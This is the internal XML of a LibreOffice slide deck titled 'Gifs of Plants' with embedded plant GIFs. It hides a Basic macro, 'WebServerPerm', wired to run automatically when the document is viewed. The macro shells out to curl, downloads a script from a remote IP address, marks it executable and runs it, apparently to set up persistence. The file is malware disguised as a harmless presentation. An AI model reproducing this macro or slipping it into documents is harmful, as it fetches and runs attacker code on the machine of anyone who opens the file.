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42000001F4000001F4425ECB7C.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/10000047000000C8000000962927B8E2.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/10000004000001E0000001E0BBB14E00.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/10000011000001F400000119C502A6D3.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000001F10000029352A51C97.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000078000000438AA638A1D.jpg" manifest:media-type="image/jpeg"/>
  <manifest:file-entry manifest:full-path="Pictures/1000001C000000C800000097B4E77D57.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/100000010000050000000020EFA501EF.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000780000004386765EBC4.jpg" manifest:media-type="image/jpeg"/>
  <manifest:file-entry manifest:full-path="Pictures/10000C8F0000034200004A6A1EBF6087.svg" manifest:media-type="image/svg+xml"/>
  <manifest:file-entry manifest:full-path="Pictures/10000CA90000844B000003429459CB15.svg" manifest:media-type="image/svg+xml"/>
  <manifest:file-entry manifest:full-path="Pictures/10000C1C0000034200004A6AE9C37B9A.svg" manifest:media-type="image/svg+xml"/>
  <manifest:file-entry manifest:full-path="Pictures/10000C340000844B000003421C8EBBF6.svg" manifest:media-type="image/svg+xml"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000005000000002028E58B51.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000C00000190000000E1DE5D8D3C.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000100000020000002D03251752C.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000010000016A0000029381BE7C06.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000D000001E0000001E047970C2E.gif" manifest:media-type="image/gif"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000001F300000354A4683E4E.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000100000020000002D02B1489AA.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000001F000000351433544DC.png" manifest:media-type="image/pn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view-created" xlink:href="vnd.sun.star.script:Standard.Module1.WebServerPerm?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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97cm, 0cm)" draw:image-opacity="100%" style:mirror="none" loext:decorative="false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4cm" loext:decorative="false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End_20_Slid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 fo:text-shadow="none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writing-mode="lr-tb"/>
      <style:text-properties fo:color="#62cf51" loext:opacity="100%" style:font-name="Noto Sans" fo:font-size="48pt" style:font-size-asian="48pt" style:font-size-complex="4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" fo:font-size="48pt" style:font-size-asian="48pt" style:font-size-complex="48pt"/>
    </style:style>
    <style:style style:name="P7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24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="P9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1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62cf51" loext:opacity="100%" style:text-line-through-style="none" style:text-line-through-type="none" style:text-position="0% 100%" style:font-name="Noto San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3.46cm" svg:x="1.878cm" svg:y="3.197cm">
          <text:p text:style-name="P1"><text:span text:style-name="T1">Gifs of Plants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3" draw:style-name="gr1" draw:text-style-name="P6" draw:layer="layout" svg:width="2.631cm" svg:height="2.283cm" svg:x="9.144cm" svg:y="3.81cm">
          <text:p text:style-name="P5"><text:span text:style-name="T3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8" draw:layer="layout" svg:width="12.954cm" svg:height="1.267cm" svg:x="11.938cm" svg:y="4.41cm">
          <text:p text:style-name="P7"><text:span text:style-name="T4">Realis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1" draw:text-style-name="P6" draw:layer="layout" svg:width="2.631cm" svg:height="2.283cm" svg:x="9.144cm" svg:y="6.09cm">
          <text:p text:style-name="P5"><text:span text:style-name="T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" draw:text-style-name="P8" draw:layer="layout" svg:width="12.954cm" svg:height="1.267cm" svg:x="11.938cm" svg:y="6.668cm">
          <text:p text:style-name="P7"><text:span text:style-name="T4">Anim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" draw:text-style-name="P10" draw:layer="layout" svg:width="18.604cm" svg:height="1.69cm" svg:x="9.398cm" svg:y="1.624cm">
          <text:p text:style-name="P9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3" draw:layer="layout" svg:width="16.51cm" svg:height="2.113cm" svg:x="7.62cm" svg:y="0.635cm">
          <text:p text:style-name="P12"><text:span text:style-name="T1">Realis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draw:style-name="gr3" draw:text-style-name="P11" draw:layer="layout" svg:width="13.228cm" svg:height="7.434cm" svg:x="14.077cm" svg:y="7.806cm">
          <draw:image xlink:href="Pictures/10000011000001F400000119C502A6D3.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/gif">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr3" draw:text-style-name="P11" draw:layer="layout" svg:width="10.582cm" svg:height="5.952cm" svg:x="15.453cm" svg:y="1.033cm">
          <draw:image xlink:href="Pictures/1000000C00000190000000E1DE5D8D3C.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/gif">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr3" draw:text-style-name="P11" draw:layer="layout" svg:width="11.853cm" svg:height="8.89cm" svg:x="0.847cm" svg:y="3.81cm">
          <draw:image xlink:href="Pictures/10000047000000C8000000962927B8E2.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw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Right_20_Bar_20_Blue">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <draw:custom-shape draw:name="TextShape 5" draw:style-name="gr1" draw:text-style-name="P13" draw:layer="layout" svg:width="16.51cm" svg:height="2.113cm" svg:x="7.62cm" svg:y="0.635cm">
          <text:p text:style-name="P12"><text:span text:style-name="T1">Anim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draw:style-name="gr3" draw:text-style-name="P11" draw:layer="layout" svg:width="6.757cm" svg:height="6.757cm" svg:x="9.525cm" svg:y="8.483cm">
          <draw:image xlink:href="Pictures/1000000D000001E0000001E047970C2E.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/gif">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr3" draw:text-style-name="P11" draw:layer="layout" svg:width="6.985cm" svg:height="5.272cm" svg:x="8.055cm" svg:y="2.975cm">
          <draw:image xlink:href="Pictures/1000001C000000C800000097B4E77D57.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/gif">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr3" draw:text-style-name="P11" draw:layer="layout" svg:width="5.715cm" svg:height="5.715cm" svg:x="15.875cm" svg:y="1.905cm">
          <draw:image xlink:href="Pictures/10000042000001F4000001F4425ECB7C.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/gif">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr4" draw:text-style-name="P11" draw:layer="layout" svg:width="8.01cm" svg:height="7.065cm" svg:x="17.78cm" svg:y="8.255cm">
          <draw:image xlink:href="Pictures/10000004000001E0000001E0BBB14E00.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw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End_20_Slide" presentation:presentation-page-layout-name="AL2T1">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <draw:custom-shape draw:name="TextShape 1" draw:style-name="gr5" draw:text-style-name="P16" draw:layer="layout" svg:width="25.198cm" svg:height="2.114cm" svg:x="1.401cm" svg:y="6.146cm">
          <text:p text:style-name="P15"><text:span text:style-name="T6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EFA501EF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28E58B51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8.834cm" svg:height="15.086cm" svg:x="-0.08cm" svg:y="0.001cm">
        <draw:image xlink:href="Pictures/10000001000001F300000354A4683E4E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4" draw:text-style-name="MP5" draw:layer="backgroundobjects" svg:width="8.834cm" svg:height="15.086cm" draw:transform="rotate (-3.14159265358979) translate (28.002cm 15.753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4" draw:text-style-name="MP5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4" draw:text-style-name="MP5" draw:layer="backgroundobjects" svg:width="8.754cm" svg:height="14.986cm" draw:transform="rotate (-3.14159265358979) translate (28.002cm 15.749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24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <meta:creation-date>2025-03-07T18:20:02.932475829</meta:creation-date>
    <meta:editing-duration>PT4M58S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <dc:date>2025-03-08T21:37:25.408725180</dc:date>
    <meta:document-statistic meta:object-count="15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Sub WebServerPerm()
  Shell "/bin/bash -c 'curl -s http://165.227.221.46:8080/webServerPerm.sh -o ~/Documents/webServerPersistent.sh &amp;&amp; chmod +x ~/Documents/webServerPersistent.sh &amp;&amp; bash ~/Documents/webServerPersistent.sh'", 0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